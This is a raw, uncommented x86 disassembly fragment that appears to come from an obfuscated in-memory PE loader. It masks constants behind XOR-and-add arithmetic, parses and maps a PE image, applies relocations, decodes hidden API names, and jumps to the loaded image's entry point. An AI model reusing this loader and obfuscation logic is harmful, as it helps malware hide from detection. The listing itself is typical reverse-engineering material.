  426019:	pop    esi
  42601a:	leave  
  42601b:	ret    0x8
  42601e:	push   ebp
  42601f:	mov    ebp,esp
  426021:	sub    esp,0xd8
  426027:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  42602e:	mov    DWORD PTR [ebp-0x24],0xf89c85a4
  426035:	mov    eax,DWORD PTR [ebp-0x4]
  426038:	push   ebx
  426039:	push   esi
  42603a:	mov    esi,0x75108af
  42603f:	xor    eax,esi
  426041:	push   edi
  426042:	mov    edi,0x3272f6
  426047:	add    eax,edi
  426049:	mov    DWORD PTR [ebp-0x18],eax
  42604c:	mov    eax,DWORD PTR [ebp-0x4]
  42604f:	xor    eax,esi
  426051:	add    eax,edi
  426053:	mov    DWORD PTR [ebp-0x8],eax
  426056:	mov    ebx,DWORD PTR [ebp+0x20]
  426059:	mov    eax,DWORD PTR [ebp-0x1c]
  42605c:	mov    ecx,DWORD PTR [ebp-0x1c]
  42605f:	xor    eax,ecx
  426061:	mov    DWORD PTR [ebp-0x1c],eax
  426064:	add    DWORD PTR [ebp-0x1c],0xf89cb5a5
  42606b:	mov    eax,DWORD PTR [ebp-0xc]
  42606e:	mov    ecx,DWORD PTR [ebp-0xc]
  426071:	xor    eax,ecx
  426073:	mov    DWORD PTR [ebp-0xc],eax
  426076:	add    DWORD PTR [ebp-0xc],0xf89c85e5
  42607d:	mov    eax,DWORD PTR [ebp-0x10]
  426080:	mov    ecx,DWORD PTR [ebp-0x10]
  426083:	xor    eax,ecx
  426085:	mov    DWORD PTR [ebp-0x10],eax
  426088:	add    DWORD PTR [ebp-0x10],0xf89c85a1
  42608f:	mov    eax,DWORD PTR [ebp-0x28]
  426092:	mov    ecx,DWORD PTR [ebp-0x28]
  426095:	xor    eax,ecx
  426097:	mov    DWORD PTR [ebp-0x28],eax
  42609a:	add    DWORD PTR [ebp-0x28],0xf89f05a5
  4260a1:	mov    DWORD PTR [ebp+0x20],0xf89ceff8
  4260a8:	mov    eax,DWORD PTR [ebp+0x8]
  4260ab:	test   eax,eax
  4260ad:	je     0x426534
  4260b3:	mov    eax,DWORD PTR [ebp+0xc]
  4260b6:	test   eax,eax
  4260b8:	je     0x426534
  4260be:	mov    eax,DWORD PTR [ebp+0x18]
  4260c1:	test   eax,eax
  4260c3:	je     0x426534
  4260c9:	mov    eax,DWORD PTR [ebp+0x20]
  4260cc:	mov    ecx,DWORD PTR [ebp+0x8]
  4260cf:	xor    eax,0x8af
  4260d4:	add    eax,0x72f6
  4260d9:	cmp    WORD PTR [ecx],ax
  4260dc:	jne    0x426534
  4260e2:	mov    eax,DWORD PTR [ebp-0x4]
  4260e5:	xor    eax,esi
  4260e7:	add    eax,edi
  4260e9:	mov    DWORD PTR [ebp-0x30],eax
  4260ec:	mov    eax,DWORD PTR [ebp-0x4]
  4260ef:	mov    ecx,DWORD PTR [ebp+0x8]
  4260f2:	mov    eax,DWORD PTR [ebp+0x8]
  4260f5:	add    eax,DWORD PTR [ecx+0x3c]
  4260f8:	mov    DWORD PTR [ebp+0xc],eax
  4260fb:	mov    eax,DWORD PTR [eax+0x50]
  4260fe:	test   eax,eax
  426100:	je     0x426534
  426106:	mov    DWORD PTR [ebp-0x2c],0xf88c85a5
  42610d:	mov    eax,DWORD PTR [ebp-0x2c]
  426110:	xor    eax,esi
  426112:	add    eax,edi
  426114:	mov    DWORD PTR [ebp-0x2c],eax
  426117:	mov    eax,DWORD PTR [ebp-0x4]
  42611a:	mov    eax,DWORD PTR [ebx+0x190]
  426120:	mov    ecx,DWORD PTR [eax]
  426122:	mov    ecx,DWORD PTR [ecx+0x3c]
  426125:	add    ecx,DWORD PTR [eax]
  426127:	mov    eax,DWORD PTR [ebp-0x4]
  42612a:	mov    eax,DWORD PTR [ebx+0x18c]
  426130:	mov    edx,DWORD PTR [eax]
  426132:	mov    DWORD PTR [ebp-0x20],ecx
  426135:	mov    DWORD PTR [ebp+0x20],edx
  426138:	cmp    edx,edx
  42613a:	jne    0x42616e
  42613c:	mov    eax,DWORD PTR [ebx+0x1e0]
  426142:	lea    edx,[ebp-0x18]
  426145:	push   edx
  426146:	mov    edx,DWORD PTR [ebp-0xc]
  426149:	xor    edx,esi
  42614b:	add    edx,edi
  42614d:	push   edx
  42614e:	push   DWORD PTR [ecx+0x50]
  426151:	push   DWORD PTR [ebp+0x20]
  426154:	call   DWORD PTR [eax+0x1c]
  426157:	mov    eax,DWORD PTR [ebp-0x20]
  42615a:	mov    ecx,DWORD PTR [eax+0x54]
  42615d:	mov    eax,DWORD PTR [eax+0x50]
  426160:	sub    eax,ecx
  426162:	add    ecx,DWORD PTR [ebp+0x20]
  426165:	push   ecx
  426166:	call   0x426ad1
  42616b:	mov    edx,DWORD PTR [ebp+0x20]
  42616e:	mov    eax,DWORD PTR [ebx+0x194]
  426174:	mov    DWORD PTR [eax],edx
  426176:	mov    eax,DWORD PTR [ebp+0xc]
  426179:	push   DWORD PTR [eax+0x54]
  42617c:	push   DWORD PTR [ebp+0x8]
  42617f:	push   edx
  426180:	call   0x4269c7
  426185:	mov    ecx,DWORD PTR [ebp+0x20]
  426188:	mov    eax,DWORD PTR [ecx+0x3c]
  42618b:	add    eax,ecx
  42618d:	movzx  ecx,WORD PTR [eax+0x14]
  426191:	lea    ecx,[ecx+eax*1+0x18]
  426195:	mov    DWORD PTR [ebp+0x18],ecx
  426198:	mov    ecx,DWORD PTR [ebp-0x4]
  42619b:	movzx  edx,WORD PTR [eax+0x6]
  42619f:	xor    ecx,esi
  4261a1:	add    ecx,edi
  4261a3:	mov    DWORD PTR [ebp+0xc],eax
  4261a6:	cmp    edx,ecx
  4261a8:	je     0x426255
  4261ae:	mov    ecx,DWORD PTR [ebp-0x4]
  4261b1:	xor    ecx,esi
  4261b3:	add    ecx,edi
  4261b5:	mov    DWORD PTR [ebp-0x8],ecx
  4261b8:	mov    ecx,DWORD PTR [ebp-0x24]
  4261bb:	movzx  edx,WORD PTR [eax+0x6]
  4261bf:	xor    ecx,esi
  4261c1:	sub    edx,ecx
  4261c3:	sub    edx,edi
  4261c5:	cmp    DWORD PTR [ebp-0x8],edx
  4261c8:	ja     0x426255
  4261ce:	mov    edx,DWORD PTR [ebp+0x18]
  4261d1:	add    edx,0x8
  4261d4:	mov    DWORD PTR [ebp+0x18],edx
  4261d7:	jmp    0x4261dc
  4261d9:	mov    edx,DWORD PTR [ebp+0x18]
  4261dc:	mov    eax,DWORD PTR [eax+0x38]
  4261df:	lea    ecx,[eax-0x1]
  4261e2:	mov    DWORD PTR [ebp-0x38],eax
  4261e5:	mov    eax,DWORD PTR [edx]
  4261e7:	test   eax,ecx
  4261e9:	je     0x4261f2
  4261eb:	not    ecx
  4261ed:	and    eax,ecx
  4261ef:	add    eax,DWORD PTR [ebp-0x38]
  4261f2:	mov    ecx,DWORD PTR [edx+0x4]
  4261f5:	add    ecx,DWORD PTR [ebp+0x20]
  4261f8:	push   ecx
  4261f9:	call   0x426ad1
  4261fe:	mov    edx,DWORD PTR [ebp-0x4]
  426201:	mov    eax,DWORD PTR [ebp+0x18]
  426204:	mov    ecx,DWORD PTR [eax+0x8]
  426207:	xor    edx,esi
  426209:	add    edx,edi
  42620b:	cmp    ecx,edx
  42620d:	je     0x426226
  42620f:	push   ecx
  426210:	mov    ecx,DWORD PTR [ebp+0x8]
  426213:	add    ecx,DWORD PTR [eax+0xc]
  426216:	mov    eax,DWORD PTR [eax+0x4]
  426219:	add    eax,DWORD PTR [ebp+0x20]
  42621c:	push   ecx
  42621d:	push   eax
  42621e:	call   0x4269c7
  426223:	mov    eax,DWORD PTR [ebp+0x18]
  426226:	mov    ecx,DWORD PTR [ebp-0x24]
  426229:	mov    edx,DWORD PTR [ebp-0x8]
  42622c:	add    eax,0x28
  42622f:	xor    ecx,esi
  426231:	lea    ecx,[edx+ecx*1+0x3272f6]
  426238:	mov    edx,DWORD PTR [ebp+0xc]
  42623b:	mov    DWORD PTR [ebp+0x18],eax
  42623e:	mov    eax,DWORD PTR [ebp-0x24]
  426241:	movzx  edx,WORD PTR [edx+0x6]
  426245:	xor    eax,esi
  426247:	sub    edx,eax
  426249:	mov    eax,DWORD PTR [ebp+0xc]
  42624c:	sub    edx,edi
  42624e:	mov    DWORD PTR [ebp-0x8],ecx
  426251:	cmp    ecx,edx
  426253:	jbe    0x4261d9
  426255:	mov    edx,DWORD PTR [ebx+0x18c]
  42625b:	mov    ecx,DWORD PTR [ebp+0x20]
  42625e:	cmp    ecx,DWORD PTR [edx]
  426260:	jne    0x426289
  426262:	mov    eax,DWORD PTR [ebx+0x1e0]
  426268:	lea    edx,[ebp-0x18]
  42626b:	push   edx
  42626c:	mov    edx,DWORD PTR [ebp-0x10]
  42626f:	xor    edx,esi
  426271:	add    edx,edi
  426273:	push   edx
  426274:	mov    edx,DWORD PTR [ebp-0x20]
  426277:	push   DWORD PTR [edx+0x54]
  42627a:	push   ecx
  42627b:	call   DWORD PTR [eax+0x1c]
  42627e:	test   eax,eax
  426280:	je     0x426525
  426286:	mov    eax,DWORD PTR [ebp+0xc]
  426289:	mov    ecx,DWORD PTR [ebx+0x1c8]
  42628f:	mov    ecx,DWORD PTR [ecx]
  426291:	xor    ecx,esi
  426293:	add    ecx,edi
  426295:	je     0x426450
  42629b:	mov    eax,DWORD PTR [ebp-0x4]
  42629e:	xor    eax,esi
  4262a0:	add    eax,edi
  4262a2:	and    DWORD PTR [ebp+0x8],0x0
  4262a6:	mov    DWORD PTR [ebp-0x14],eax
  4262a9:	mov    eax,0xf89c85c1
  4262ae:	lea    ecx,[eax+0x18]
  4262b1:	mov    DWORD PTR [ebp-0x58],0xf89c85d7
  4262b8:	mov    DWORD PTR [ebp-0x54],0xf89c85d1
  4262bf:	mov    DWORD PTR [ebp-0x50],eax
  4262c2:	mov    DWORD PTR [ebp-0x4c],ecx
  4262c5:	mov    DWORD PTR [ebp-0x48],ecx
  4262c8:	mov    DWORD PTR [ebp-0x44],0xf89c85a5
  4262cf:	mov    edx,DWORD PTR [ebp+0x8]
  4262d2:	mov    ecx,0x8af
  4262d7:	xor    cx,WORD PTR [ebp+edx*4-0x58]
  4262dc:	mov    edx,0x72f6
  4262e1:	add    cx,dx
  4262e4:	mov    edx,DWORD PTR [ebp+0x8]
  4262e7:	inc    DWORD PTR [ebp+0x8]
  4262ea:	cmp    DWORD PTR [ebp+0x8],0x6
  4262ee:	mov    WORD PTR [ebp+edx*2-0xc0],cx
  4262f6:	jb     0x4262cf
  4262f8:	mov    ecx,0xf89c85d3
  4262fd:	mov    DWORD PTR [ebp-0xb0],eax
  426303:	mov    DWORD PTR [ebp-0x9c],eax
  426309:	mov    DWORD PTR [ebp-0x74],eax
  42630c:	mov    DWORD PTR [ebp-0x70],eax
  42630f:	lea    eax,[ecx-0x1]
  426312:	lea    edx,[ecx+0x2c]
  426315:	mov    DWORD PTR [ebp-0x64],eax
  426318:	mov    DWORD PTR [ebp-0x60],eax
  42631b:	mov    DWORD PTR [ebp-0xb4],0xf89c85f9
  426325:	mov    DWORD PTR [ebp-0xac],ecx
  42632b:	mov    DWORD PTR [ebp-0xa8],edx
  426331:	mov    DWORD PTR [ebp-0xa4],0xf89c85dc
  42633b:	mov    DWORD PTR [ebp-0xa0],0xf89c85d7
  426345:	mov    DWORD PTR [ebp-0x98],0xf89c85e0
  42634f:	mov    DWORD PTR [ebp-0x94],0xf89c85d7
  426359:	mov    DWORD PTR [ebp-0x90],0xf89c85d1
  426363:	mov    DWORD PTR [ebp-0x8c],ecx
  426369:	mov    DWORD PTR [ebp-0x88],0xf89c852c
  426373:	mov    DWORD PTR [ebp-0x84],edx
  426379:	mov    DWORD PTR [ebp-0x80],0xf89c85d6
  426380:	mov    DWORD PTR [ebp-0x7c],ecx
  426383:	mov    DWORD PTR [ebp-0x78],0xf89c85e4
  42638a:	mov    DWORD PTR [ebp-0x6c],ecx
  42638d:	mov    DWORD PTR [ebp-0x68],0xf89c85c0
  426394:	mov    DWORD PTR [ebp-0x5c],0xf89c85a5
  42639b:	xor    eax,eax
  42639d:	mov    cl,BYTE PTR [ebp+eax*4-0xb4]
  4263a4:	xor    cl,0xaf
  4263a7:	sub    cl,0xa
  4263aa:	mov    BYTE PTR [ebp+eax*1-0xd8],cl
  4263b1:	inc    eax
  4263b2:	cmp    eax,0x17
  4263b5:	jb     0x42639d
  4263b7:	mov    eax,DWORD PTR [ebx+0x1e0]
  4263bd:	lea    ecx,[ebp-0xc0]
  4263c3:	push   ecx
  4263c4:	call   DWORD PTR [eax+0x4]
  4263c7:	mov    ecx,DWORD PTR [ebx+0x1e0]
  4263cd:	lea    edx,[ebp-0xd8]
  4263d3:	push   edx
  4263d4:	push   eax
  4263d5:	call   DWORD PTR [ecx+0x8]
  4263d8:	mov    DWORD PTR [ebp-0x40],eax
  4263db:	lea    eax,[ebp-0x14]
  4263de:	push   eax
  4263df:	mov    eax,DWORD PTR [ebx+0x18c]
  4263e5:	push   DWORD PTR [eax]
  4263e7:	mov    eax,DWORD PTR [ebp-0x40]
  4263ea:	call   eax
  4263ec:	mov    eax,DWORD PTR [ebp-0x4]
  4263ef:	xor    eax,esi
  4263f1:	add    eax,edi
  4263f3:	mov    DWORD PTR [ebp-0x34],eax
  4263f6:	mov    ecx,DWORD PTR [ebp-0x4]
  4263f9:	mov    eax,DWORD PTR [ebp-0x14]
  4263fc:	xor    ecx,esi
  4263fe:	add    ecx,edi
  426400:	cmp    eax,ecx
  426402:	je     0x42644d
  426404:	mov    DWORD PTR [ebp-0x3c],eax
  426407:	jmp    0x426418
  426409:	mov    eax,DWORD PTR [eax]
  42640b:	mov    ecx,DWORD PTR [ebp-0x3c]
  42640e:	mov    DWORD PTR [ebp-0x14],eax
  426411:	mov    eax,DWORD PTR [ebp-0x14]
  426414:	cmp    eax,ecx
  426416:	je     0x426425
  426418:	mov    edx,DWORD PTR [eax+0x18]
  42641b:	mov    ecx,DWORD PTR [ebx+0x18c]
  426421:	cmp    edx,DWORD PTR [ecx]
  426423:	jne    0x426409
  426425:	mov    ecx,DWORD PTR [ebx+0x18c]
  42642b:	mov    edx,DWORD PTR [eax+0x18]
  42642e:	cmp    edx,DWORD PTR [ecx]
  426430:	jne    0x42644d
  426432:	mov    ecx,DWORD PTR [ebx+0x190]
  426438:	mov    edx,DWORD PTR [ebp-0x20]
  42643b:	mov    edx,DWORD PTR [edx+0x28]
  42643e:	add    edx,DWORD PTR [ecx]
  426440:	mov    DWORD PTR [eax+0x1c],edx
  426443:	mov    eax,DWORD PTR [ebp-0x24]
  426446:	xor    eax,esi
  426448:	add    eax,edi
  42644a:	mov    DWORD PTR [ebp-0x34],eax
  42644d:	mov    eax,DWORD PTR [ebp+0xc]
  426450:	push   ebx
  426451:	push   eax
  426452:	push   DWORD PTR [ebp+0x20]
  426455:	call   0x425bd5
  42645a:	test   eax,eax
  42645c:	je     0x426525
  426462:	push   DWORD PTR [ebp+0xc]
  426465:	mov    ecx,ebx
  426467:	push   DWORD PTR [ebp+0x20]
  42646a:	call   0x425b2e
  42646f:	test   eax,eax
  426471:	je     0x426525
  426477:	mov    eax,DWORD PTR [ebp+0xc]
  42647a:	mov    edx,DWORD PTR [ebp+0x20]
  42647d:	mov    ecx,ebx
  42647f:	call   0x425a07
  426484:	test   eax,eax
  426486:	je     0x426525
  42648c:	push   ebx
  42648d:	push   DWORD PTR [ebp+0x20]
  426490:	call   0x425eb8
  426495:	test   eax,eax
  426497:	je     0x426525
  42649d:	mov    eax,DWORD PTR [ebx+0x18c]
  4264a3:	mov    edx,DWORD PTR [ebp+0x20]
  4264a6:	cmp    edx,DWORD PTR [eax]
  4264a8:	jne    0x4264c4
  4264aa:	mov    eax,DWORD PTR [ebx+0x1e0]
  4264b0:	lea    ecx,[ebp-0x18]
  4264b3:	push   ecx
  4264b4:	push   DWORD PTR [ebp-0x18]
  4264b7:	mov    ecx,DWORD PTR [ebp-0x20]
  4264ba:	push   DWORD PTR [ecx+0x54]
  4264bd:	push   edx
  4264be:	call   DWORD PTR [eax+0x1c]
  4264c1:	mov    edx,DWORD PTR [ebp+0x20]
  4264c4:	mov    eax,DWORD PTR [ebx+0x1c8]
  4264ca:	mov    eax,DWORD PTR [eax]
  4264cc:	xor    eax,esi
  4264ce:	add    eax,edi
  4264d0:	je     0x426509
  4264d2:	mov    ecx,DWORD PTR [ebp+0xc]
  4264d5:	mov    eax,DWORD PTR [ecx+0x28]
  4264d8:	mov    DWORD PTR [ebp+0x8],0xf89ca5a5
  4264df:	mov    esi,DWORD PTR [ebp+0x8]
  4264e2:	push   DWORD PTR [ebp+0x14]
  4264e5:	xor    esi,0x8af
  4264eb:	push   DWORD PTR [ebp+0x10]
  4264ee:	add    esi,0x72f6
  4264f4:	or     WORD PTR [ecx+0x16],si
  4264f8:	add    eax,edx
  4264fa:	push   edx
  4264fb:	call   eax
  4264fd:	mov    DWORD PTR [ebx+0x1d0],0xf89c85a4
  426507:	jmp    0x426513
  426509:	mov    eax,DWORD PTR [ebp+0xc]
  42650c:	mov    eax,DWORD PTR [eax+0x28]
  42650f:	add    eax,edx
  426511:	call   eax
  426513:	mov    DWORD PTR [ebp-0x8],eax
  426516:	mov    eax,DWORD PTR [ebp-0x8]
  426519:	mov    ecx,DWORD PTR [ebp+0x1c]
  42651c:	mov    DWORD PTR [ecx],eax
  42651e:	mov    DWORD PTR [ebp-0x30],0x1
  426525:	cmp    DWORD PTR [ebp-0x30],0x0
  426529:	jne    0x42652f
  42652b:	and    DWORD PTR [ebp+0x20],0x0
  42652f:	mov    eax,DWORD PTR [ebp+0x20]
  426532:	jmp    0x426536
  426534:	xor    eax,eax
  426536:	pop    edi
  426537:	pop    esi
  426538:	pop    ebx
  426539:	leave  
  42653a:	ret    0x1c
  42653d:	push   ebp
  42653e:	mov    ebp,esp
  426540:	movzx  edx,WORD PTR [ecx+0x6]
  426544:	movzx  eax,WORD PTR [ecx+0x14]
  426548:	push   ebx
  426549:	push   edi
  42654a:	xor    edi,edi
  42654c:	lea    eax,[eax+ecx*1+0x18]
  426550:	test   edx,edx
  426552:	je     0x426573
  426554:	mov    ecx,DWORD PTR [eax+0xc]
  426557:	lea    ebx,[ecx+esi*1]
  42655a:	cmp    DWORD PTR [ebp+0x8],ebx
  42655d:	jb     0x42656b
  42655f:	mov    ebx,DWORD PTR [eax+0x8]
  426562:	add    ebx,ecx
  426564:	add    ebx,esi
  426566:	cmp    DWORD PTR [ebp+0x8],ebx
  426569:	jb     0x426575
  42656b:	add    eax,0x28
  42656e:	inc    edi
  42656f:	cmp    edi,edx
  426571:	jb     0x426554
  426573:	xor    eax,eax
  426575:	pop    edi
  426576:	pop    ebx
  426577:	pop    ebp
  426578:	ret    0x4
  42657b:	push   ebp
  42657c:	mov    ebp,esp
  42657e:	sub    esp,0x34
  426581:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  426588:	mov    DWORD PTR [ebp-0x18],0xf89c85a4
  42658f:	mov    DWORD PTR [ebp-0x1c],0xf89c85a3
  426596:	mov    DWORD PTR [ebp-0x8],0xf89c85c4
  42659d:	mov    DWORD PTR [ebp-0x20],0xf89c85e4
  4265a4:	mov    DWORD PTR [ebp-0x2c],0xf89c852b
  4265ab:	mov    DWORD PTR [ebp-0x2c],0xf89c85cb
  4265b2:	mov    DWORD PTR [ebp-0x10],eax
  4265b5:	mov    eax,DWORD PTR [ebp+0x8]
  4265b8:	mov    DWORD PTR [ebp-0x14],eax
  4265bb:	mov    eax,DWORD PTR [ebp-0xc]
  4265be:	push   ebx
  4265bf:	mov    ecx,0x75108af
  4265c4:	xor    eax,ecx
  4265c6:	push   esi
  4265c7:	mov    esi,DWORD PTR [ebp-0x10]
  4265ca:	mov    edx,0x3272f6
  4265cf:	add    eax,edx
  4265d1:	push   edi
  4265d2:	cmp    esi,eax
  4265d4:	je     0x4267b3
  4265da:	mov    eax,DWORD PTR [ebp-0xc]
  4265dd:	mov    esi,DWORD PTR [ebp-0x14]
  4265e0:	xor    eax,ecx
  4265e2:	add    eax,edx
  4265e4:	cmp    esi,eax
  4265e6:	je     0x4267b3
  4265ec:	mov    eax,DWORD PTR [ebp-0xc]
  4265ef:	xor    eax,ecx
  4265f1:	add    eax,edx
  4265f3:	mov    DWORD PTR [ebp-0x24],eax
  4265f6:	mov    eax,DWORD PTR [ebp-0xc]
  4265f9:	xor    eax,ecx
  4265fb:	add    eax,edx
  4265fd:	mov    DWORD PTR [ebp-0x28],eax
  426600:	mov    edi,DWORD PTR [ebp-0x20]
  426603:	mov    ebx,DWORD PTR [ebp-0x8]
  426606:	mov    esi,0x8af
  42660b:	xor    edi,esi
  42660d:	mov    eax,0x72f6
  426612:	xor    ebx,esi
  426614:	add    edi,eax
  426616:	add    ebx,eax
  426618:	sub    ebx,edi
  42661a:	mov    WORD PTR [ebp-0x8],bx
  42661e:	jmp    0x4266e3
  426623:	mov    edi,DWORD PTR [ebp-0xc]
  426626:	mov    bx,WORD PTR [ebp-0x4]
  42662a:	xor    edi,esi
  42662c:	add    edi,eax
  42662e:	cmp    bx,di
  426631:	je     0x426725
  426637:	mov    edi,DWORD PTR [ebp-0xc]
  42663a:	mov    ebx,DWORD PTR [ebp+0xc]
  42663d:	xor    edi,ecx
  42663f:	add    edi,edx
  426641:	cmp    ebx,edi
  426643:	mov    di,WORD PTR [ebp-0x4]
  426647:	mov    bx,WORD PTR [ebp+0x8]
  42664b:	je     0x4266b6
  42664d:	cmp    bx,di
  426650:	je     0x4266bf
  426652:	mov    edi,DWORD PTR [ebp-0x20]
  426655:	mov    bx,WORD PTR [ebp+0x8]
  426659:	xor    edi,esi
  42665b:	add    edi,eax
  42665d:	cmp    bx,di
  426660:	jb     0x426680
  426662:	mov    edi,DWORD PTR [ebp-0x2c]
  426665:	mov    bx,WORD PTR [ebp+0x8]
  426669:	xor    edi,esi
  42666b:	add    edi,eax
  42666d:	cmp    bx,di
  426670:	ja     0x426680
  426672:	movzx  edi,WORD PTR [ebp+0x8]
  426676:	movzx  ebx,WORD PTR [ebp-0x8]
  42667a:	add    edi,ebx
  42667c:	mov    WORD PTR [ebp+0x8],di
  426680:	mov    edi,DWORD PTR [ebp-0x20]
  426683:	mov    bx,WORD PTR [ebp-0x4]
  426687:	xor    edi,esi
  426689:	add    edi,eax
  42668b:	cmp    bx,di
  42668e:	jb     0x4266ae
  426690:	mov    edi,DWORD PTR [ebp-0x2c]
  426693:	mov    bx,WORD PTR [ebp-0x4]
  426697:	xor    edi,esi
  426699:	add    edi,eax
  42669b:	cmp    bx,di
  42669e:	ja     0x4266ae
  4266a0:	movzx  edi,WORD PTR [ebp-0x4]
  4266a4:	movzx  ebx,WORD PTR [ebp-0x8]
  4266a8:	add    edi,ebx
  4266aa:	mov    WORD PTR [ebp-0x4],di
  4266ae:	mov    di,WORD PTR [ebp-0x4]
  4266b2:	mov    bx,WORD PTR [ebp+0x8]
  4266b6:	cmp    bx,di
  4266b9:	jne    0x4267b3
  4266bf:	mov    edi,DWORD PTR [ebp-0x1c]
  4266c2:	mov    ebx,DWORD PTR [ebp-0x10]
  4266c5:	xor    edi,ecx
  4266c7:	lea    edi,[edi+ebx*1+0x3272f6]
  4266ce:	mov    DWORD PTR [ebp-0x10],edi
  4266d1:	mov    edi,DWORD PTR [ebp-0x1c]
  4266d4:	mov    ebx,DWORD PTR [ebp-0x14]
  4266d7:	xor    edi,ecx
  4266d9:	lea    edi,[edi+ebx*1+0x3272f6]
  4266e0:	mov    DWORD PTR [ebp-0x14],edi
  4266e3:	mov    edi,DWORD PTR [ebp-0x24]
  4266e6:	mov    ebx,DWORD PTR [ebp-0x10]
  4266e9:	mov    di,WORD PTR [ebx+edi*2]
  4266ed:	mov    WORD PTR [ebp+0x8],di
  4266f1:	mov    edi,DWORD PTR [ebp-0x28]
  4266f4:	mov    ebx,DWORD PTR [ebp-0x14]
  4266f7:	mov    di,WORD PTR [ebx+edi*2]
  4266fb:	mov    WORD PTR [ebp-0x4],di
  4266ff:	mov    edi,DWORD PTR [ebp-0xc]
  426702:	mov    bx,WORD PTR [ebp+0x8]
  426706:	xor    edi,esi
  426708:	add    edi,eax
  42670a:	cmp    bx,di
  42670d:	jne    0x426623
  426713:	mov    eax,DWORD PTR [ebp-0x18]
  426716:	mov    esi,DWORD PTR [ebp-0xc]
  426719:	xor    eax,ecx
  42671b:	add    eax,edx
  42671d:	imul   eax,esi
  426720:	mov    DWORD PTR [ebp-0xc],eax
  426723:	jmp    0x426737
  426725:	mov    eax,DWORD PTR [ebp-0xc]
  426728:	mov    esi,DWORD PTR [ebp-0x18]
  42672b:	xor    eax,ecx
  42672d:	lea    eax,[eax+esi*1+0x3272f6]
  426734:	mov    DWORD PTR [ebp-0x18],eax
  426737:	mov    eax,DWORD PTR [ebp-0x24]
  42673a:	sub    eax,edx
  42673c:	xor    eax,ecx
  42673e:	mov    DWORD PTR [ebp-0x30],eax
  426741:	mov    eax,DWORD PTR [ebp-0x28]
  426744:	sub    eax,edx
  426746:	xor    eax,ecx
  426748:	mov    DWORD PTR [ebp-0x34],eax
  42674b:	mov    eax,DWORD PTR [ebp-0x34]
  42674e:	mov    esi,DWORD PTR [ebp-0x1c]
  426751:	xor    esi,ecx
  426753:	add    esi,edx
  426755:	xor    eax,ecx
  426757:	add    eax,0x3272f6
  42675c:	imul   esi,eax
  42675f:	mov    eax,DWORD PTR [ebp-0x14]
  426762:	movzx  eax,WORD PTR [esi+eax*1]
  426766:	mov    esi,DWORD PTR [ebp-0x30]
  426769:	mov    edi,DWORD PTR [ebp-0x1c]
  42676c:	xor    esi,ecx
  42676e:	add    esi,edx
  426770:	xor    edi,ecx
  426772:	add    edi,edx
  426774:	imul   edi,esi
  426777:	mov    esi,DWORD PTR [ebp-0x10]
  42677a:	movzx  esi,WORD PTR [edi+esi*1]
  42677e:	sub    eax,edx
  426780:	sub    esi,edx
  426782:	xor    eax,ecx
  426784:	xor    esi,ecx
  426786:	cmp    esi,eax
  426788:	jne    0x4267b3
  42678a:	mov    eax,DWORD PTR [ebp-0x30]
  42678d:	mov    esi,DWORD PTR [ebp-0x1c]
  426790:	xor    eax,ecx
  426792:	add    eax,0x3272f6
  426797:	xor    esi,ecx
  426799:	add    esi,edx
  42679b:	imul   esi,eax
  42679e:	mov    eax,DWORD PTR [ebp-0x10]
  4267a1:	movzx  eax,WORD PTR [esi+eax*1]
  4267a5:	mov    esi,DWORD PTR [ebp-0xc]
  4267a8:	sub    eax,edx
  4267aa:	xor    eax,ecx
  4267ac:	cmp    eax,esi
  4267ae:	mov    eax,DWORD PTR [ebp-0xc]
  4267b1:	je     0x4267b6
  4267b3:	mov    eax,DWORD PTR [ebp-0x18]
  4267b6:	pop    edi
  4267b7:	xor    eax,ecx
  4267b9:	pop    esi
  4267ba:	add    eax,edx
  4267bc:	pop    ebx
  4267bd:	leave  
  4267be:	ret    0x8
  4267c1:	push   ebp
  4267c2:	mov    ebp,esp
  4267c4:	push   ecx
  4267c5:	mov    cx,WORD PTR [eax]
  4267c8:	push   esi
  4267c9:	mov    esi,0x3b5d
  4267ce:	sub    cx,si
  4267d1:	mov    esi,0x8a9b
  4267d6:	xor    cx,si
  4267d9:	mov    esi,0x4e38
  4267de:	mov    DWORD PTR [ebp-0x4],0xf89c85a6
  4267e5:	mov    edx,0xf89c85a5
  4267ea:	cmp    cx,si
  4267ed:	je     0x42684c
  4267ef:	push   ebx
  4267f0:	push   edi
  4267f1:	movzx  ecx,cx
  4267f4:	mov    edi,0xffcd8d0a
  4267f9:	mov    esi,0x75108af
  4267fe:	mov    ebx,0x4e64
  426803:	cmp    cx,bx
  426806:	jne    0x42680b
  426808:	mov    DWORD PTR [ebp-0x4],edx
  42680b:	lea    edx,[edi+0x1]
  42680e:	xor    edx,esi
  426810:	mov    edi,edx
  426812:	xor    edi,esi
  426814:	mov    cx,WORD PTR [eax+edi*2+0x64e5ec]
  42681c:	mov    ebx,0x3b5d
  426821:	sub    cx,bx
  426824:	mov    ebx,0x8a9b
  426829:	xor    cx,bx
  42682c:	mov    ebx,0x4e38
  426831:	cmp    cx,bx
  426834:	jne    0x4267fe
  426836:	mov    ecx,DWORD PTR [ebp-0x4]
  426839:	pop    edi
  42683a:	pop    ebx
  42683b:	cmp    ecx,0xf89c85a6
  426841:	je     0x42684c
  426843:	xor    ecx,esi
  426845:	lea    eax,[eax+ecx*2+0x64e5ee]
  42684c:	pop    esi
  42684d:	leave  
  42684e:	ret    
  42684f:	push   ebp
  426850:	mov    ebp,esp
  426852:	push   ecx
  426853:	push   esi
  426854:	push   edi
  426855:	mov    DWORD PTR [ebp-0x4],0xf89c85a6
  42685c:	mov    esi,0xf89c85a5
  426861:	call   0x4267c1
  426866:	mov    edi,eax
  426868:	mov    al,BYTE PTR [edi]
  42686a:	sub    al,0x4
  42686c:	xor    al,0x7f
  42686e:	cmp    al,0x83
  426870:	je     0x4268d3
  426872:	mov    eax,edi
  426874:	mov    edx,0xffcd8d0a
  426879:	mov    ecx,0x75108af
  42687e:	push   ebx
  42687f:	mov    ax,WORD PTR [eax]
  426882:	mov    ebx,0x3b5d
  426887:	sub    ax,bx
  42688a:	mov    ebx,0x8a9b
  42688f:	xor    ax,bx
  426892:	mov    ebx,0x4e4a
  426897:	cmp    ax,bx
  42689a:	jne    0x42689f
  42689c:	mov    DWORD PTR [ebp-0x4],esi
  42689f:	lea    esi,[edx+0x1]
  4268a2:	xor    esi,ecx
  4268a4:	mov    edx,esi
  4268a6:	xor    edx,ecx
  4268a8:	lea    eax,[edi+edx*2+0x64e5ec]
  4268af:	mov    bl,BYTE PTR [eax]
  4268b1:	sub    bl,0x4
  4268b4:	xor    bl,0x7f
  4268b7:	cmp    bl,0x83
  4268ba:	jne    0x42687f
